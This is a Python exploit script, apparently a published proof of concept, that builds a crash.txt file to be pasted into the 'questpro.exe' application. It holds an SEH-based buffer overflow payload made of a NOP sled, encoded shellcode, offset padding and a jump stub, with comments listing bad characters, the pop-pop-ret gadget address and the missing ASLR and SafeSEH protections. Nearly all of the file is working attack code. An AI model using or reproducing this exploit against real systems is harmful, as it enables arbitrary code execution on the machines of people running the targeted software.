#!/usr/bin/python
#1- Open 'questpro.exe'
#2- Go to Add   
#3- Paste payload from generated txt file

blt = '\033[92m[\033[0m+\033[92m]\033[0m '           # green success bullet
err = '\033[91m[\033[0m!\033[91m]\033[0m '           # red   error   bullet

File     = 'crash.txt'

try:
    # SEH triggered by exception 'Access violation when reading [41414141]'
    # EIP: 00403AB8    8B10       mov edx, dword ptr ds:[eax]
    # Bad Charaters - These bytes truncate the buffer on stack:
    #    badchrs  = '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d'
    # offset is here in paylaod structure (4116 byte offset for nSEH)
    nops     = '\x90'*400
    shellcode =  b""
    shellcode += b"\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0"
    shellcode += b"\x5e\x81\x76\x0e\xb2\xa7\xb0\x13\x83\xee\xfc"
    shellcode += b"\xe2\xf4\x4e\x4f\x32\x13\xb2\xa7\xd0\x9a\x57"
    shellcode += b"\x96\x70\x77\x39\xf7\x80\x98\xe0\xab\x3b\x41"
    shellcode += b"\xa6\x2c\xc2\x3b\xbd\x10\xfa\x35\x83\x58\x1c"
    shellcode += b"\x2f\xd3\xdb\xb2\x3f\x92\x66\x7f\x1e\xb3\x60"
    shellcode += b"\x52\xe1\xe0\xf0\x3b\x41\xa2\x2c\xfa\x2f\x39"
    shellcode += b"\xeb\xa1\x6b\x51\xef\xb1\xc2\xe3\x2c\xe9\x33"
    shellcode += b"\xb3\x74\x3b\x5a\xaa\x44\x8a\x5a\x39\x93\x3b"
    shellcode += b"\x12\x64\x96\x4f\xbf\x73\x68\xbd\x12\x75\x9f"
    shellcode += b"\x50\x66\x44\xa4\xcd\xeb\x89\xda\x94\x66\x56"
    shellcode += b"\xff\x3b\x4b\x96\xa6\x63\x75\x39\xab\xfb\x98"
    shellcode += b"\xea\xbb\xb1\xc0\x39\xa3\x3b\x12\x62\x2e\xf4"
    shellcode += b"\x37\x96\xfc\xeb\x72\xeb\xfd\xe1\xec\x52\xf8"
    shellcode += b"\xef\x49\x39\xb5\x5b\x9e\xef\xcf\x83\x21\xb2"
    shellcode += b"\xa7\xd8\x64\xc1\x95\xef\x47\xda\xeb\xc7\x35"
    shellcode += b"\xb5\x58\x65\xab\x22\xa6\xb0\x13\x9b\x63\xe4"
    shellcode += b"\x43\xda\x8e\x30\x78\xb2\x58\x65\x79\xba\xfe"
    shellcode += b"\xe0\xf1\x4f\xe7\xe0\x53\xe2\xcf\x5a\x1c\x6d"
    shellcode += b"\x47\x4f\xc6\x25\xcf\xb2\x13\x95\xa8\x39\xf5"
    shellcode += b"\xd8\xb7\xe6\x44\xda\x65\x6b\x24\xd5\x58\x65"
    shellcode += b"\x44\xda\x10\x59\x2b\x4d\x58\x65\x44\xda\xd3"
    shellcode += b"\x5c\x28\x53\x58\x65\x44\x25\xcf\xc5\x7d\xff"
    shellcode += b"\xc6\x4f\xc6\xda\xc4\xdd\x77\xb2\x2e\x53\x44"
    shellcode += b"\xe5\xf0\x81\xe5\xd8\xb5\xe9\x45\x50\x5a\xd6"
    shellcode += b"\xd4\xf6\x83\x8c\x12\xb3\x2a\xf4\x37\xa2\x61"
    shellcode += b"\xb0\x57\xe6\xf7\xe6\x45\xe4\xe1\xe6\x5d\xe4"
    shellcode += b"\xf1\xe3\x45\xda\xde\x7c\x2c\x34\x58\x65\x9a"
    shellcode += b"\x52\xe9\xe6\x55\x4d\x97\xd8\x1b\x35\xba\xd0"
    shellcode += b"\xec\x67\x1c\x40\xa6\x10\xf1\xd8\xb5\x27\x1a"
    shellcode += b"\x2d\xec\x67\x9b\xb6\x6f\xb8\x27\x4b\xf3\xc7"
    shellcode += b"\xa2\x0b\x54\xa1\xd5\xdf\x79\xb2\xf4\x4f\xc6"

    offset   = '\x41' * (4116-len(nops+shellcode)-22)
    jmpStart = '\xe8\xff\xff\xff\xff\xc3\x59\x31\xd2\x66\x81\xca\x03\x10\x66\x29\xd1\xff\xe1\xe8\xe8\xff'
#    nSEH     = '\xeb\xe8\x90\x90' # jmp short -22 (to jmpStart)
    # 0x00400000 [questpro.exe] Rebase: False | ASLR: False | SafeSEH: False 
    # 0x0042666b [questpro.exe] : pop ecx # pop ebp # ret  | {PAGE_EXECUTE_READ} 
#    SEH      = '\x6b\x66\x42'
    payload  = nops+shellcode+offset+jmpStart
    f        = open(File, 'w')                       # open file for write
    f.write(payload)
    f.close()                                        # close the file
    print blt + File + " created successfully "
except:
    print err + File + ' failed to create'

